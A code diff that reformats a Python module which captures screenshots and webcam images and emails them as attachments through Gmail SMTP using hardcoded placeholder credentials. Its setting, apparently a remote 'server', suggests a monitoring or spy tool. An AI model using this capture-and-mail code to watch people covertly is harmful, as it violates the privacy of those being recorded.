@@ -1,6 +1,7 @@
 from PIL import ImageGrab
 from datetime import datetime
-import email, smtplib
+import email
+import smtplib
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
@@ -13,17 +14,19 @@ GMAIL = "email@gmail.com"
 PASSWORD = "pw"
 SMTP_HOST = 'smtp.gmail.com'
 
+
 def screenshot():
     img = ImageGrab.grab()
-    path = ".\data\screenshot"+ datetime.now().strftime("_%Y%m%d_%H%M%S") +".jpg"
+    path = ".\data\screenshot" + datetime.now().strftime("_%Y%m%d_%H%M%S") + ".jpg"
     img.save(path)
     return path
+
 
 def webcamshot():
     # initialize the camera
     cam = cv2.VideoCapture(0)   # 0 -> index of camera
     s, img = cam.read()
-    if s:    # frame captured without any errors 
+    if s:    # frame captured without any errors
 
         '''#Show captured image on server screen
         cv2.namedWindow("Press any key to exit ...")
@@ -31,15 +34,18 @@ def webcamshot():
         cv2.waitKey(0)
         cv2.destroyWindow("Press any key to exit ...")'''
 
-        filepath = ".\data\webcamshot{}.jpg".format(datetime.now().strftime("_%Y%m%d_%H%M%S"))
-        cv2.imwrite(filepath,img)
+        filepath = ".\data\webcamshot{}.jpg".format(
+            datetime.now().strftime("_%Y%m%d_%H%M%S"))
+        cv2.imwrite(filepath, img)
         return filepath
+
 
 class MailSender:
     def __init__(self) -> None:
-        self.server =  smtplib.SMTP_SSL(host=SMTP_HOST, port=smtplib.SMTP_SSL_PORT, timeout=None)
+        self.server = smtplib.SMTP_SSL(
+            host=SMTP_HOST, port=smtplib.SMTP_SSL_PORT, timeout=None)
         self.server.login(GMAIL, PASSWORD)
-        
+
     def send_plaintext_email(self, receiver, sbj, msg):
         message = f"""\
         Subject: {sbj}
@@ -65,7 +71,7 @@ class MailSender:
                 part = MIMEBase("application", "octet-stream")
                 part.set_payload(attachment.read())
 
-            # Encode file in ASCII characters to send by email    
+            # Encode file in ASCII characters to send by email
             encoders.encode_base64(part)
 
             filename = os.path.basename(file_path)
@@ -81,4 +87,4 @@ class MailSender:
 
         # Send email
         self.server.sendmail(from_addr=GMAIL, to_addrs=receiver, msg=text)
-
+        print('mail sent')
